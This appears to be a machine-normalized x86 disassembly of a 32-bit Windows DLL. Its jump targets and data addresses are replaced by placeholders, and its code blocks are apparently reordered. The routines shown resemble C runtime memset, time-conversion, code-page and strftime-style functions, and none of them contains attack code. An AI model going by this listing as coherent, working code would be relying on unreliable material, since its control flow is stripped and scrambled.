cmp edi esi
jb r-xdata
push esi
push [ ebp - 0x4 ]
push edi
call sub_1000e79a
add esp 0xc
and [ esi + edi ] 0x0
jmp r-xdata
mov esi eax
push edi
push ebx
push [ ebp + 0x10 ]
call sub_1000e79a
mov eax [ ebp + 0x10 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
sub_10009030
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_10009096
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1000927a
test eax eax
pop ecx
je r-xdata
call sub_1000e8bb
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10009384
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10009384
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_1000927a
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_1000b211
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_10008cba
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_10009384
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_1000e8bb
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_1000927a
mov esi eax
push esi
call sub_1000eb70
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1000927a
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_1000eb70
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1000927a
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_100094e4
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_1000b7a4
push [ ebp + 0x8 ]
call sub_10009691
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_1000970e
xor edx edx
mov eax rw-data
push 0x19
call sub_1000b805
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_100096db
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_10009737
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_100096db
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_10009691
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_100096db
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000970e
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_10009737
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_1000ee7d
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_1000b4c0
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_1000b4c0
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_100098f3
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x18 ]
push ebx
push esi
xor esi esi
cmp eax esi
push edi
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edi rw-data
mov [ ebp + 0x18 ] eax
push edi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] esi
mov ebx [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] esi
push edi
call ebx
push 0x13
call sub_1000b7a4
pop ecx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi [ ebp + 0x10 ]
cmp [ ebp + 0x18 ] esi
jbe r-xdata
push edi
call ebx
push 0x13
call sub_1000b805
pop ecx
jmp r-xdata
cmp al 0x25
je r-xdata
xor eax eax
leave
retn
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x18 ]
leave
retn
cmp [ ebp + 0x18 ] 0x0
pop edi
pop esi
pop ebx
jbe r-xdata
and [ rw-data ] 0x0
inc esi
cmp [ esi ] 0x23
jne r-xdata
mov edx [ rw-data ]
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
mov al [ esi ]
push [ ebp + 0x14 ]
push eax
call sub_100099ed
add esp 0x14
inc esi
mov [ rw-data ] 0x1
inc esi
mov ecx [ ebp + 0x8 ]
mov al [ esi ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp + 0x18 ]
jmp r-xdata
cmp [ ebp + 0x18 ] 0x1
jbe r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp + 0x18 ]
sub_100099ed
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push ebx
push esi
cmp eax 0x5a
push edi
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
call sub_1000e8bb
mov ecx [ ebp + 0xc ]
push [ ebp + 0x14 ]
xor eax eax
cmp [ ecx + 0x20 ] eax
push [ ebp + 0x10 ]
setne al
push [ eax * 4 + rw-data ]
jmp r-xdata
cmp eax 0x4d
jg r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0x14 ]
cmp [ eax + 0x8 ] 0xb
push [ ebp + 0x10 ]
mov eax [ ebp + 0x18 ]
jg r-xdata
sub eax 0x7
je r-xdata
mov eax [ rw-data ]
push [ ebp + 0x14 ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
push 0x2
jmp r-xdata
sub eax 0x61
je r-xdata
call sub_10009ddc
add esp 0xc
sub eax 0x53
je r-xdata
je r-xdata
push [ eax + 0x9c ]
push [ eax + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push 0x1
push [ eax + 0x18 ]
jmp r-xdata
dec eax
je r-xdata
inc eax
push eax
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x18 ]
push [ ecx + eax * 4 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push 0x2
push [ eax ]
jmp r-xdata
dec eax
dec eax
je r-xdata
push [ ebp + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push 0x2
push [ eax + 0x4 ]
jmp r-xdata
sub eax 0x25
je r-xdata
call sub_10009e03
add esp 0x10
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec eax
je r-xdata
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
push [ ecx + eax * 4 + 0x38 ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
mov esi [ eax + 0x18 ]
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ecx ] 0x25
inc [ eax ]
mov eax [ ebp + 0x14 ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0xa0 ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
and [ rw-data ] 0x0
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0xa4 ]
mov eax [ rw-data ]
push [ ebp + 0x14 ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push 0x2
push 0x64
cdq
pop ecx
idiv ecx
jmp r-xdata
dec eax
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec eax
je r-xdata
mov eax ecx
push 0x7
cdq
pop edi
idiv edi
push 0x7
mov edi eax
mov eax ecx
cdq
pop ecx
idiv ecx
cmp edx esi
jl r-xdata
xor edi edi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
dec eax
je r-xdata
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x18 ]
push [ ecx + eax * 4 + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
call sub_10009ebb
add esp 0x14
jmp r-xdata
push edx
jmp r-xdata
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0xc ]
push [ ebx + 0xa0 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
and [ rw-data ] 0x0
push ebx
push esi
push edi
push [ ebp + 0xc ]
push [ ebx + 0xa4 ]
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push 0x2
push [ eax + 0xc ]
jmp r-xdata
sub eax 0x6
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x2
push edi
jmp r-xdata
inc edi
lea esi [ ecx - 0x1 ]
jmp r-xdata
push 0x6
pop esi
jmp r-xdata
mov eax [ ebp + 0x18 ]
and [ rw-data ] 0x0
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
jmp r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
push [ ecx + eax * 4 + 0x68 ]
jmp r-xdata
sub eax 0x6
je r-xdata
mov eax [ edi ]
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov [ eax ] 0x20
inc [ edi ]
dec [ esi ]
push [ ebx + 0xa8 ]
jmp r-xdata
call sub_10009ebb
add esp 0x14
cmp [ esi ] 0x0
je r-xdata
mov eax [ rw-data ]
push [ ebp + 0x14 ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ eax + 0x1c ]
push 0x3
mov ecx [ eax + 0x1c ]
cmp ecx esi
jge r-xdata
mov eax [ rw-data ]
push [ ebp + 0x14 ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov ecx [ eax + 0x14 ]
push 0x4
mov eax ecx
push 0x64
cdq
pop esi
idiv esi
push 0x64
mov esi eax
mov eax ecx
cdq
pop ecx
add esi 0x13
idiv ecx
imul esi esi 0x64
add esi edx
push esi
push [ ebp + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push 0x2
push [ eax + 0x8 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
push 0xc
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
pop ecx
mov eax [ eax + 0x8 ]
cdq
idiv ecx
test edx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x2
push ecx
pop edx
sub_10009ddc
mov ecx [ esp + 0xc ]
push esi
push edi
cmp [ ecx ] 0x0
je r-xdata
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
mov esi [ esp + 0xc ]
mov edi [ eax ]
mov [ edi ] dl
inc [ eax ]
inc esi
dec [ ecx ]
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_10009e03
push ebp
mov ebp esp
push ecx
xor eax eax
push edi
cmp [ rw-data ] eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov edi [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ edi ]
jae r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10009e72
add esp 0xc
jmp r-xdata
mov [ edi ] eax
dec ecx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
test eax eax
je r-xdata
pop edi
leave
retn
mov eax [ ebp - 0x4 ]
add [ esi ] eax
sub [ edi ] eax
pop esi
jmp r-xdata
push ebx
mov eax [ ebp + 0x8 ]
push 0xa
cdq
pop ebx
idiv ebx
mov eax [ esi ]
add dl 0x30
mov [ eax + ecx ] dl
mov eax [ ebp + 0x8 ]
cdq
idiv ebx
inc [ ebp - 0x4 ]
dec ecx
cmp ecx 0xffffffff
mov [ ebp + 0x8 ] eax
jne r-xdata
pop ebx
sub_10009e72
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ edi ]
mov [ edi ] ecx
dec ecx
mov eax [ ebp + 0x8 ]
push 0xa
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x8 ]
add dl 0x30
mov [ ecx ] dl
inc ecx
cdq
idiv ebx
dec [ esi ]
test eax eax
mov [ ebp + 0x8 ] eax
jg r-xdata
mov bl [ eax ]
mov dl [ ecx ]
mov [ ecx ] bl
dec ecx
mov [ eax ] dl
inc eax
cmp eax ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ esi ] 0x1
jbe r-xdata
sub_10009ebb
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov al [ ebx ]
mov [ ebp + 0xb ] al
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov dl [ ebp + 0xb ]
inc ecx
inc [ ebp + 0x10 ]
mov al [ eax ]
cmp al dl
je r-xdata
dec [ ebp + 0x10 ]
mov [ ebp + 0x8 ] ecx
movsx eax dl
cmp eax 0x64
jg r-xdata
sub eax 0x68
je r-xdata
je r-xdata
dec ecx
je r-xdata
sub eax 0x5
je r-xdata
dec ecx
je r-xdata
cmp eax 0x27
je r-xdata
mov [ rw-data ] 0x1
dec ecx
je r-xdata
dec ecx
je r-xdata
sub eax 0x6
je r-xdata
mov [ rw-data ] 0x1
dec ecx
je r-xdata
test cl 0x1
je r-xdata
cmp eax 0x41
je r-xdata
mov ebx [ ebp + 0x10 ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x49
jmp r-xdata
mov [ rw-data ] 0x1
dec ecx
je r-xdata
dec ecx
je r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
push edi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
call sub_100099ed
add esp 0x14
jmp r-xdata
mov [ ebp + 0x14 ] 0x64
jmp r-xdata
dec ecx
je r-xdata
add ebx ecx
jmp r-xdata
add ebx ecx
push r--data
push ebx
call sub_1000efd0
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp eax 0x48
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ rw-data ]
movzx eax dl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov [ ebp + 0x14 ] 0x4d
jmp r-xdata
jmp r-xdata
mov [ rw-data ] 0x1
dec ecx
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x18 ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov [ ebp + 0x14 ] 0x61
jmp r-xdata
dec ecx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push r--data
push ebx
call sub_1000efd0
pop ecx
test eax eax
pop ecx
jne r-xdata
add ebx 0x5
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x4d
je r-xdata
xor ecx ecx
cmp [ edi ] ecx
je r-xdata
mov eax [ esi ]
mov cl [ ebx ]
mov [ eax ] cl
inc [ esi ]
inc ebx
dec [ edi ]
mov eax [ esi ]
mov ebx [ ebp - 0x4 ]
mov [ eax ] dl
inc [ esi ]
dec [ edi ]
mov [ ebp + 0x14 ] 0x53
jmp r-xdata
jmp r-xdata
mov eax [ eax + 0x9c ]
mov eax [ eax + 0x98 ]
jmp r-xdata
mov eax ecx
dec eax
dec eax
je r-xdata
mov [ ebp + 0x14 ] 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov [ ebp + 0x14 ] 0x70
jmp r-xdata
add ebx 0x3
mov [ ebp + 0x10 ] ebx
mov [ rw-data ] 0x1
dec ecx
je r-xdata
dec ecx
je r-xdata
cmp eax 0x61
je r-xdata
